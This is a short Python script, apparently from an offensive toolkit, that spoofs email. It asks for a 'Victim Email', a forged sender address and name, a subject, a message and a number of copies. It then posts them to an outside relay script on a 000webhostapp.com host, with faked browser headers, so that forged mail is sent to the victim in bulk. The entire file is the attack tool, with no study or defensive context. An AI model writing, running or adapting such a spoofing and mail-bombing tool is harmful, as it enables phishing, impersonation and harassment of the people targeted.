def espof():
    import requests
    from termcolor import colored
    num_lines = 5
    url = "https://0xffvirus.000webhostapp.com/mail.php" # Mail Script
    email_to = input(colored("Victim Email: ", 'red')) # Victim Email
    email_from = input(colored("Email From: ", 'red')) # From Email
    sendname = input(colored("Sender Name: ", 'red')) # Sender Name
    subject = input(colored("Subject: ", 'red')) # Subject
    print(colored("Message: [ 5 lines ]", 'red')) # 5 Lines Message
    msg = ""
    for i in range(num_lines):
        msg += input() + "\n"

    emailnum = int(input(colored("Number of emails: ", 'red'))) # Number of emails send
    headers = { # Headers
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "content-length": "121",
        "content-type": "application/x-www-form-urlencoded",
        "origin":"https://0xffvirus.000webhostapp.com",
        "referer":"https://0xffvirus.000webhostapp.com/main.html",
        "sec-fetch-dest":"document",
        "sec-fetch-mode":"navigate",
        "sec-fetch-site":"same-origin",
        "sec-fetch-user":"?1",
        "sec-gpc":"1",
        "upgrade-insecure-requests":"1",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
    }
    data = { # Payload
        "mail_to": email_to,
        "mail_from": email_from,
        "subject": subject,
        "message": msg,
        "count": emailnum,
        "submit":"Submit",
        "name": sendname,
    }
    requests.post(url, headers=headers, data=data) # Post headers and data to web server
    print(colored(f"[ Email Sent Successfully | {email_from} --> {email_to} N:{emailnum}]", 'green')) # Successful Message
    input(colored("Press Enter to exit ...", 'red'))
